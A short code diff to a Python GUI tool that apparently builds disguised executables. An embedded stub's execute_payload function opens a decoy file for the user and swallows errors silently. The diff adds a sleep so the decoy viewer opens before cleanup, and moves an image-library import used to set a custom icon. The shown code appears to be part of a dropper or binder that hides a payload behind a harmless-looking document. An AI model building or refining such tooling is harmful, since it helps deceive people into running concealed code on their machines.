@@ -5,7 +5,6 @@ import tempfile
 import sys
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox
-from PIL import Image
 import threading # Use threading to keep the GUI responsive during compilation
 
 # --- Configuration ---
@@ -55,6 +54,7 @@ def _ui_notify(root_widget, level, title, message):
 
 def create_icon_from_image(image_path, icon_path):
     try:
+        from PIL import Image
         img = Image.open(image_path)
         icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (256, 256)]
         img.save(icon_path, format="ICO", sizes=icon_sizes)
@@ -72,6 +72,7 @@ import subprocess
 import tempfile
 import sys
 import shutil
+import time
 
 def get_resource_path(relative_path):
     try:
@@ -110,6 +111,9 @@ def execute_payload():
             subprocess.Popen(['xdg-open', decoy_path_out])
         else:
             subprocess.Popen(['open', decoy_path_out])
+
+        # Wait for the viewer to open the file before cleaning up
+        time.sleep(5)
             
     except Exception as e:
         pass # Fail silently
